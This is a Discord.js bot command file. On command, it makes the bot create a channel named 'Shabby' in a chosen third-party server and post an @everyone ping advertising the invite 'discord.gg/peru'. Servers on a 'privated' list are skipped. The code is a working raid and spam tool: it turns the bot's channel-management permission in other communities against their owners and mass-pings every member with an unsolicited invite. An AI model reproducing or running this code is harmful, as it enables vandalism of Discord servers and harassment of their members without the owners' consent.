const { EmbedBuilder } = require("discord.js");
const Member = require("../../models/member");
const Guilds = require("../../models/guilds")
const dayjs = require('dayjs')
const { error, hershell, success } = require("../lib/util");
module.exports = {
  name: "channel",
  description: "asd",
  auth: true,
  run: async (client, message, args, usMember, usOwner, usBlock) => {

    let id = await client.guilds.cache.get(args[0])
    if(!id) return error(message, "I'm not on that server!")

    let guildPriv = await Guilds.findOne({ guildId: id })
    if(guildPriv) return error(message, 'That server is one of the servers privated!')

    if(!id.members.me.permissions.has("ManageChannels")) return error(message, "I'm missing permissions!")

    if(id.channels.cache.size >= 498) return error(message, 'That server has the channel limit!')
    id.channels.create({
        name: 'Shabby'
    }).then(c => {
        c.send("@everyone discord.gg/peru")
    })
    
  success(message, `Has been created a channel in the server **${id.name}**`)

  },
};